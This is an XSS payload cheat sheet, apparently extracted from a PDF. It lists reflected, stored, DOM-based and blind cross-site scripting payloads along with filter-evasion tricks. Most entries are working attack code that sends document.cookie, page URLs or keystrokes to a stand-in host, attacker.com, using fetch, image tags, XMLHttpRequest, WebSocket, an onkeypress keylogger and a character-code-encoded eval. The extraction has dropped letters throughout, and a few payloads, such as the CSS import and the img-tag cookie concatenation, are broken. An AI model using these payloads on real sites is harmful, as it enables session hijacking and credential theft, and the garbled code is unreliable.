**Reflected Cross-Site Scrip ng (XSS)**

1. Basic alert: 
<script>alert('XSS');</script> 
1. Stealing Cookies: 
<script>fetch('h p://a acker.com/log?cookie=' + document.cookie);</script> 
2. Redirec ng the User: 

<script>window.loca on='h p://a acker.com'</script> 

3. Bypassing Filters (using encoded characters): 

<img src=x onerror=alert('XSS')> 

Or encoded version: 

%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E 

4. Using an Event Handler: 

<a href="#" onclick="alert(1)">Click me!</a> 

5. Advanced Payload (using IIFE): 

<script>(()=>{alert('XSS')})()</script> 

----

**Stored Cross-Site Scrip ng (Stored XSS)** 

1. Simple Alert Box: 
<script>alert('XSS');</script> 
2. Stealing Cookies: 
<script>fetch('h ps://a acker.com/log?cookie=' + document.cookie);</script> 
3. Session Hijacking using Image Tag: 
<img src="x" onerror="fetch('h ps://a acker.com/log?cookie='+document.cookie)"> 
4. Automa c Redirec on 
<script>window.loca on='h ps://a acker.com'</script> 
Advanced Payloads 
1. Bypassing Filters (using JavaScript event handlers): 
<svg onload=alert('XSS')> 
2. Using HTML A ributes: 
<input type="text" value="" onfocus="alert('XSS')" autofocus> 
3. Obfuscated JavaScript: 
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> 
4. IIFE (Immediately Invoked Func on Expression): 
<script>(func on(){alert('XSS')})()</script> 

---
**DOM-based Cross-Site Scrip ng (DOM XSS)**
1. URL Parameter Exploita on 
h p://example.com/page.html?name=<script>alert('XSS')</script> 
2. Loca on Hash Manipula on 
h p://example.com/page.html#<img src=x onerror=alert('XSS')> 
3. document.referrer Exploita on 
<a href="h p://example.com/vulnerablePage.html">Go to vulnerable site</a> 
4. Using localStorage 
localStorage.setItem('user', '<img src=x onerror=alert("XSS")>'); 
loca on.reload(); 
5. Bypassing Filters with eval() 
h p://example.com/page.html?data=alert('XSS') 
6. loca on.search with innerHTML 
h p://example.com/page.html?message=<svg/onload=alert('XSS')> 

---

**Basic Blind XSS Payloads **
1. Basic Exfiltra on using <script> 
<script>new Image().src='h ps://a acker.com/log?cookie='+document.cookie;</script> 
2. Using fetch() for Stealth 
<script> 
fetch('h ps://a acker.com/log', { 
method: 'POST', 
mode: 'no-cors', 
body: 'cookie=' + document.cookie + '&url=' + loca on.href 
}); 
</script> 
3. Stealing Data with an img tag 
<img src="h ps://a acker.com/log?data=" + document.cookie> 
Advanced Blind XSS Payloads 
1. Using XMLH pRequest 
<script> 
var xhr = new XMLH pRequest(); 
xhr.open("GET", "h ps://a acker.com/log?cookie=" + document.cookie, true); 
xhr.send(); 
</script> 
2. DOM Exfiltra on with window.onunload 
<body onunload="fetch('h ps://a acker.com/log?cookie=' + document.cookie)"> 
3. Keylogger Payload 
<script> 
document.onkeypress = func on(e) { 
fetch('h ps://a acker.com/keys?key=' + String.fromCharCode(e.which)); 
}; 
</script> 

---

**Obfuscated and Filter Evasion Techniques**
1. Encoded Characters 
<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,
 97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,63,99,111,111,107,105,101,61
 ,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));</script> 
2. Bypassing Filters with SVG 
<svg onload="fetch('h ps://a acker.com/log?cookie='+document.cookie)"> 
3. Using setTimeout 
<script>setTimeout(func on(){fetch('h ps://a acker.com/log?cookie='+document.cookie)}, 2000);</script> 

---

**Stealthy Payloads for Non-Script Contexts**
1. Using an HTML Attribute 
<iframe srcdoc="<script>new 
Image().src='https://attacker.com/log?cookie='+document.cookie;</script>"></iframe> 
2. CSS-Based Payload 
<style>@import 'https://attacker.com/log?cookie='+document.cookie;</style> 
3. Exfiltra ng via WebSocket 
<script> 
let ws = new WebSocket("wss://a acker.com/socket"); 
ws.onopen = func on() { 
ws.send(document.cookie); 
}; 
</script>

---
